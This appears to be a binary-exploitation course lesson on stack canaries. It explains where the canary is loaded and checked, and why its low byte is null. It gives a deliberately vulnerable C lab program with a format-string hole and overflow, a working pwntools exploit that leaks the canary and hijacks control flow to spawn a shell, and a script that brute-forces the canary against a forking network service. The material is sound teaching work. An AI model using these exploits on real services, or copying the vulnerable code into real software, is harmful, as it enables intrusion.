---
title: "Lesson 5.2: Stack canary mechanism, leak, and brute force"
image:
  path: /assets/img/covers/pwn-5-2-stack-canary-mechanism-leak-brute-force.webp
  alt: "Stack canary mechanism, leak, and brute force"
date: 2022-11-21 19:30:00 +0700
categories: ["Binary Exploitation", "Pwn · Mitigations"]
tags: [pwn, canary, format-string]
render_with_liquid: false
---

The canary is the defense sitting right in front of saved RIP. This lesson dissects its mechanism, then two ways past it: leaking the value so you can write it back correctly, or brute forcing it byte by byte when the service forks and keeps the same canary.

![Leaking a canary through a format string, then writing it back to cross it](/assets/img/pwn/pwn-5-2-stack-canary-mechanism-leak-brute-force.svg)
_A format string leak reads the canary out; the overflow writes the same value back before reaching saved RIP._

Part: 5 (Mitigations) | Time: about 60 minutes reading plus lab | Difficulty: medium to hard

**Prerequisites:** Lesson 5.1 (mitigations overview), Lesson 3.2 (offset to saved RIP). It helps to skim Lesson 7.1 (format string) since we use it here to leak.

**Tools:** gcc, gdb + pwndbg, pwntools, checksec.

## Goals

By the end of this lesson you can explain where the canary lives, where it is loaded from, and where it is checked. You can leak a canary with a format string and write it back correctly to get past an overflow. You understand why the lowest byte of the canary is always 0x00. You can brute force a canary byte by byte in a fork server scenario.

## 1. Theory

### Where the canary lives and how it runs

When the compiler sees a function with a stack buffer, it inserts two pieces of code. The prologue (start of the function) loads an 8-byte value from TLS (Thread Local Storage, memory private to each thread, reached on x86-64 through the fs segment register) into a slot just below saved RBP:

```asm
mov    rax, qword ptr fs:[0x28]    ; load the master canary from TLS
mov    qword ptr [rbp - 8], rax    ; place it on the stack, right before saved RBP/RIP
```

The epilogue (end of the function, right before `ret`) compares the stack value against the original in TLS.

```asm
mov    rax, qword ptr [rbp - 8]
sub    rax, qword ptr fs:[0x28]
jne    __stack_chk_fail           ; different -> abort
```

If they differ, `__stack_chk_fail` prints "*** stack smashing detected ***" and ends the process. The stack layout, from the bottom (low address) up (high address), looks like this.

```
[ local buffer ] [ ... ] [ CANARY 8 bytes ] [ saved RBP ] [ saved RIP ]
```

For a linear write (continuous from the buffer upward) to reach saved RIP, you are forced to pass through the canary. Writing the wrong value aborts immediately. That is its entire strength.

### The 0x00 byte at the bottom

On x86-64 glibc, the lowest byte of the canary is always 0x00 (null). This is a deliberate design: a canary starting with a null byte makes string functions (strcpy, and printf's `%s`) stop right there, so an overflow through a string cannot easily carry the whole canary along, and when you leak the canary you will see 7 random bytes followed by one 00 byte at the end. Always check `canary & 0xff == 0` to know you leaked the right slot and not garbage.

### Two ways past it

The canary blocks a linear overflow. So to get past it, either you turn it into something no longer secret, or you avoid having to guess it at all.

1. Leak it, then write it back. If you have a primitive (a controllable read/write capability) to read memory, you read the canary out. When you overflow, you insert the exact same canary value back into the right spot, the epilogue finds a match, and lets execution continue to saved RIP. The most common basic leak techniques are these.
   - Format string: with `printf(user_input)`, use `%p` or `%lx` at the right offset on the stack to print the canary out. You find the offset by firing a series of `%p` and looking for an 8-byte value ending in 00.
   - Partial overwrite with `%s`: overwrite exactly the null byte at the bottom of the canary with a non-null character, so a later `%s` print no longer stops at the canary and prints the canary bytes along with it. This is an advanced off-by-one technique, mentioned so you know it exists, no need to master it right now.

2. Brute force under fork. Many network services follow a fork server model: the parent process `accept`s a connection then `fork`s a child to handle it, and the child does NOT `exec` the program again. Since `fork` copies memory wholesale, including TLS, every child shares the exact same canary as the parent. And the canary is only regenerated on `exec`. As a result, you can brute force one byte at a time. For each position, try all 256 values; a correct byte lets the child pass the check and behave normally, a wrong byte kills the child with stack smashing. The first byte is already known to be 00, so you have only 7 bytes left, at most 7 x 256 = 1792 tries, instead of 2^64. Trick: fix every byte already found, only probe the next one.

## 2. Demo

Environment: Ubuntu 24.04, glibc 2.39, gcc 13.3.0. Full source, build.sh, exploit, and transcript (real output) are in the Lab section below.

### Demo A: leak the canary through a format string, then overflow

Source `canary.c`.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    puts("[+] got past the canary. Shell:");
    system("/bin/sh");
}

void vuln(void) {
    char buf[64];
    printf("echo> ");
    read(0, buf, 0x100);
    printf(buf);              // format string hole, used to leak the canary
    puts("");
    printf("round 2> ");
    read(0, buf, 0x100);      // second overflow, has to go through the canary
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

Build with the canary at its strongest, no-PIE so we do not also have to leak the image base (one mitigation at a time), and add `-fcf-protection=none` so the `ret` gadget keeps the stack clean.

```bash
gcc -fstack-protector-all -no-pie -fcf-protection=none -O0 -g -o lab canary.c
pwn checksec lab      # Canary found, No PIE (0x400000), NX enabled
```

Before writing the script, find two numbers: the format string offset to the canary slot, and the offset from the start of buf to the canary. Format string offset: try it by hand, type `%6$p|%7$p|...|%16$p` and look for a value that is 8 bytes ending in 00, that is the canary; count position to know which `%N$p` to use. Buffer-to-canary offset: use pwndbg, set a breakpoint at the second `read`, measure the distance between `buf` and the `[rbp-8]` slot. For this lab binary, disassembling `vuln` shows `buf = rbp-0x50` and `canary = rbp-0x8`, so buf to canary = `0x50 - 0x8 = 0x48 = 72` bytes, and the canary lands exactly at format offset `%15$p` (an 8-byte value ending in 00). These are real measurements of this lab's binary, a different binary may differ, always verify yourself.

```python
from pwn import *

elf = context.binary = ELF('./lab')
io = process('./lab')

# stage 1: leak the canary through the format string (offset 15 is a real measurement from this lab)
# wrapped in :: because buf is not null-terminated after input, to avoid landing on later stack garbage
io.sendafter(b'echo> ', b'::%15$p::')
io.recvuntil(b'::')
canary = int(io.recvuntil(b'::', drop=True), 16)
log.info(f'canary = {hex(canary)}')
assert canary & 0xff == 0, 'the lowest byte must be 00, otherwise the leak hit the wrong slot'

# stage 2: overflow, write the correct canary back before reaching saved RIP
offset_buf_to_canary = 72                   # measured via disas/gdb: buf=rbp-0x50, canary=rbp-0x8
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]           # a ret gadget to align 16 bytes before calling system
payload  = b'A' * offset_buf_to_canary
payload += p64(canary)                      # the correct canary in place, gets past the epilogue
payload += b'B' * 8                          # overwrite saved RBP
payload += p64(ret)                          # alignment
payload += p64(elf.sym['win'])
io.sendafter(b'round 2> ', payload)

io.interactive()
```

Two easy mistakes: first, the offsets 15 and 72 above are real measurements for this specific lab binary; a different binary may differ, always measure again. Second, if `win` calling `system` crashes in `movaps`, that is an alignment bug, insert an extra `ret` gadget before the target address (as in the script) so rsp lands on a multiple of 16.

Real result, ran with `python3 exploit.py` from the Lab section below, ASLR on.

```
[+] canary = 0x4e95b43c20ae6c00
[+] got past the canary. Shell:
===SHELL_OK===
uid=0(root) gid=0(root) groups=0(root)
```

The canary is new on every exec (run 3 times, 3 different `0x...00` values), but because the script leaks it fresh each time it still reliably gets a shell. If you deliberately overflow without writing back the correct canary, you immediately get `*** stack smashing detected ***: terminated`. The full transcript is in the Lab section below.

Finding the offset to the canary with cyclic gives certainty.

```python
# run this once separately to get the offset: send a pattern into the second read,
# set a breakpoint on the canary comparison in gdb, look at the value that got overwritten
payload = cyclic(200)
# in pwndbg: at __stack_chk_fail or when viewing [rbp-8], cyclic_find(the_value)
```

### Demo B: brute force the canary through fork

Suppose a service forks on every connection and never re-execs (for example quickly set up with `socat TCP-LISTEN:1337,reuseaddr,fork EXEC:./canary`, or a hand-written server using `fork`). The canary stays the same across children, so you can probe it byte by byte.

```python
from pwn import *

HOST, PORT = '127.0.0.1', 1337
offset = 72                                  # start of buf to canary, verify yourself
known = b'\x00'                              # the first byte is already known to be null

while len(known) < 8:
    for b in range(256):
        io = remote(HOST, PORT)
        # overwrite exactly enough: fill the buffer then set the already known canary bytes plus one byte being tried
        io.send(b'A' * offset + known + bytes([b]))
        resp = io.recvall(timeout=0.5)
        io.close()
        # correct guess: the child does not report stack smashing, behaves normally
        if b'stack smashing' not in resp and b'*** ' not in resp and len(resp) > 0:
            known += bytes([b])
            log.info(f'byte {len(known)-1} = {hex(b)}')
            break
    else:
        log.failure('byte not found, review the crash-detection criteria')
        break

log.success(f'canary = {known[::-1].hex()}  (remember to read in little-endian order when using it)')
```

The success/failure criterion is the crux: a wrong guess kills the child with stack smashing (you will see that message, or an early-closed connection, or missing normal output); a correct guess lets the child keep running like nothing happened. Watch your own service's behavior closely in both the correct and wrong cases and adjust the `if` condition to match. Once you have all 8 bytes, assemble them into the canary and use it exactly like in Demo A.

## 3. Lab

- Task: the binary described in the Lab section below (`src.c`, built with `build.sh`: `gcc -fstack-protector-all -no-pie -fcf-protection=none -O0 -g -o lab src.c`) has a `printf(buf)` format string hole and an overflow right after it.
- Goal: leak the canary, then overflow while writing the canary back correctly to jump to `win` (or to ret2libc if there is no `win`).
- A working reference solution, with the real transcript, is in the Lab section below.
- Hints, in steps:
  - Hint 1: find the format string offset first, confirm the value ends in 00.
  - Hint 2: find the offset from the buffer to the canary with cyclic and pwndbg, do not guess.
  - Hint 3: if jumping to a function that calls system causes a SIGSEGV, add a `ret` gadget to align 16 bytes.
- Check yourself: can you explain why you must write back the EXACT canary rather than overwriting with some fixed arbitrary value?

## 4. Key takeaways

- The canary sits between the buffer and saved RIP, loaded from fs:0x28, checked in the epilogue.
- The lowest byte is always 00, used to recognize a correct leak of that slot.
- If you can leak it, write it back correctly during the overflow and the canary becomes meaningless.
- Fork keeps the canary unchanged, so brute forcing 7 bytes is enough.
- Remember the movaps alignment requirement when finally calling system.

## 5. Common pitfalls

- Forgetting the null byte at the bottom. Leaking it then plugging it back in but missing the 00 byte shifts everything by a full 8 bytes, the canary is wrong, abort. Always `assert canary & 0xff == 0`.
- Getting the format string offset wrong, printing a different stack value that also looks like an address. Verify with the trailing-00 signature and by rerunning and seeing it change each time.
- The buffer-to-canary offset shifting due to compiler alignment. Only cyclic plus gdb give the correct number, the "buf plus 8" formula is just a rough estimate.
- Using the wrong crash criterion when brute forcing. Without a reliable way to distinguish correct from wrong, you get garbage bytes. Watch the service's behavior closely in both cases.
- Assuming canary brute forcing always works. It only works when the service forks without re-exec. Every exec regenerates the canary, making brute forcing pointless.

## 6. Further reading

- glibc's stack smashing protector (SSP) and the options `-fstack-protector`, `-fstack-protector-all`, `-fstack-protector-strong`.
- Lesson 7.1 (format string) to get comfortable with leaking.
- pwn.college's canary lessons and LiveOverflow's video series on the stack cookie.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 5.2</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/5.2.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/5.2/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/5.2/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/5.2/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>
